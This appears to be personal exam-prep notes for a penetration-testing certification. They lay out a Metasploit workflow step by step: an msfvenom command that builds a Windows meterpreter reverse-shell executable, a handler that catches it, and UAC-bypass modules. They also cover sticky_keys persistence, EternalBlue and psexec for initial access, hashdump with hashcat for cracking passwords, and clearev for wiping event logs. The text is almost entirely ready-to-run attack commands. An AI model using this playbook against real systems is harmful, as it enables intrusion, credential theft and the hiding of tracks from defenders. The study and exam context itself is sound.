**-p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe**.  
![](../img/Pasted%20image%2020260321123832.png)  
  
**msfconsole**  
**use exploit/multi/handler**  
**set payload windows/meterpreter/reverse_tcp**  
**set lhost 10.10.1.13**  
**set lport 444**  
run  
  
![](../img/Pasted%20image%2020260321124549.png)  
  
![](../img/Pasted%20image%2020260321125945.png)  
  
sysinfo - pcname, os and domain  
  
getuid- current user id  
  
![](../img/Pasted%20image%2020260321130106.png)  
  
Getting unrestricted access  
-----------------------------------------  
  
background - to put session in background  
  
search bypass uac to check available modules  
  
**use exploit/windows/local/bypassuac_fodhelper**  
or  
**use exploit/windows/local/bypassuac_silentcleanup**  
  
set session 1  
  
show options  
  
**set LHOST 10.10.1.13**  
  
**set TARGET 0**  
  
**getsystem -t 1**  
  
**getuid** and press **Enter**  
  
**background**  
  
**use post/windows/manage/sticky_keys**  
  
**sessions -i***  
  
**set session 2**  
  
exploit  
  
---  
  
## Exam Privilege Escalation Flowchart  
  
### Step 1: Get Initial Access  
  
| Scenario | Method |  
|----------|--------|  
| Port 445 open + Windows 7/2008 | `use exploit/windows/smb/ms17_010_eternalblue` |  
| Port 445 open + have creds/hash | `use exploit/windows/smb/psexec` → set SMBUser/SMBPass |  
| Have payload on target | `use exploit/multi/handler` → wait for reverse shell |  
| Web shell / command injection | Upload msfvenom payload, catch with handler |  
  
### Step 2: Check Who You Are  
  
```  
getuid              → if NT AUTHORITY\SYSTEM → you're done, skip to hashdump  
getuid              → if regular user → need privesc, go to Step 3  
```  
  
### Step 3: Try Easy Privesc First  
  
```  
getsystem  
```  
  
| Result | Next Action |  
|--------|-------------|  
| Got SYSTEM | Done. Run `hashdump`, `clearev` etc. |  
| Failed | Go to Step 4 |  
  
### Step 4: Bypass UAC  
  
```  
background  
use exploit/windows/local/bypassuac_fodhelper  
set SESSION [id]  
set LHOST [your ip]  
exploit  
```  
  
| Result | Next Action |  
|--------|-------------|  
| New elevated session opens | Run `getsystem` → should work now |  
| Failed | Try `bypassuac_eventvwr` or `bypassuac_sluihijack` instead |  
  
### Step 5: If All UAC Bypass Fails  
  
```  
run post/multi/recon/local_exploit_suggester  
```  
This lists kernel exploits for the target. Pick one and try it.  
  
### Step 6: Once You're SYSTEM  
  
| Task | Command |  
|------|---------|  
| Confirm SYSTEM | `getuid` |  
| Dump password hashes | `hashdump` |  
| Crack NTLM hashes | `hashcat -m 1000 hash.txt rockyou.txt` |  
| Search for files | `search -f *.txt` or `search -f flag*` |  
| Download a file | `download C:\\Users\\Admin\\Desktop\\secret.txt` |  
| Get a CMD shell | `shell` → `net user` / `whoami /priv` |  
| Clear tracks | `clearev` |  
  
---  
  
## Quick Decision Tree  
  
```  
Got meterpreter session?  
├── YES → getuid  
│   ├── SYSTEM → hashdump, done  
│   └── Regular user → getsystem  
│       ├── Success → hashdump, done  
│       └── Failed → background → bypassuac_fodhelper  
│           ├── New session → getsystem → hashdump  
│           └── Failed → try bypassuac_eventvwr  
│               └── Failed → local_exploit_suggester  
└── NO → check payload matches handler, re-run .exe on target  
```  
  
---  
  
## Exam Answer Extraction  
  
The exam doesn't ask "escalate privileges". It asks for a **value**:  
  
| Question Pattern                     | What To Do                                |     |  
| ------------------------------------ | ----------------------------------------- | --- |  
| "What is the password of user X?"    | `hashdump` → crack with hashcat/john      |     |  
| "How many users on the machine?"     | `shell` → `net user` → count              |     |  
| "What is the OS of machine X?"       | `sysinfo`                                 |     |  
| "Find the secret in file X"          | `search -f filename` → `download` → `cat` |     |  
| "What groups does user X belong to?" | `shell` → `net user [username]`           |     |  
